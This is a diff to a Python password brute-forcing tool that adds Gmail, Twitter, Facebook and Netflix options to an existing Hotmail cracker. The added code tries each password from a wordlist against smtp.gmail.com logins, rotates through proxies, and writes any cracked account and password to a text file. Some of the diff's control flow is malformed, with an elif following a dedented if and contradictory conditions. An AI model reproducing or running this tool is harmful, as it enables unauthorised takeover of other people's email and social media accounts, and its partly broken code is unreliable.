@@ -47,15 +47,22 @@ _____________________                              _____________________
                                    \/ 
 {}
 -----------------------------------------------------------------------
+-g --gmail                              ACCOUNT gmail @gmail.com
 -t --hotmail                            ACCOUNT hotmail @hotmail.com
+-T --twitter                            ACCOUNT  twitter @
+-f --facebook                           ACCOUNT  facebook @
+-n --netflix                            Account  Netflix @
 -l --list                               List    Password BrutoForce
 -p --password                           Single  Password
 -X --proxy                              Proxy list
                             
 							   """.format(G,R))
 
-
+use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
 use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
+use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
+use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
+use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -89,7 +96,12 @@ def proxy():
     except:
         return proxy()
 
-    elif options.hotmail != 
+
+if options.gmail == None  :
+    
+                    print(use.usage)
+                    exit()       
+    elif options.hotmail != None or options.gmail == None:
         smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
@@ -111,9 +123,43 @@ def proxy():
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-		
-                       
+    if options.twitter != None :
+        hejab = threading.Thread(target=twitter,name="hejab")
+        hejab.start()
+    if options.facebook != None :
+        facebook = threading.Thread(target=facebook,name="facebook")
+        facebook.start()
+    if options.netflix != None:
+        netflix = threading.Thread(target=Netflix,name="Netflix")
+        netflix.start()
+    
+
+elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
+    smtp_srverG= smtplib.SMTP('smtp.gmail.com', 587)
+    smtp_srverG.ehlo()
+    smtp_srverG.starttls()
+    if options.password != None or options.list_password == None  :
+        print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
+        try :    
+            smtp_srverG.login(options.gmail,options.password)
+            print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
+            Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
+        except :
+            print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
+    elif options.list_password !=None:
+        password_list = io.open(options.list_password,"r").readlines()
+        for password in password_list:
+            password = password.rstrip("\n")
+            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
+            try :    
+                smtp_srverG.login(options.gmail,password)
+                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
+                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+password+"\n")
+                break
+            except smtplib.SMTPAuthenticationError:
+                print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
+
 else:
     print(use.usage)
     exit()  
-############################################################O FIM####################################################################
+############################################################THE END####################################################################
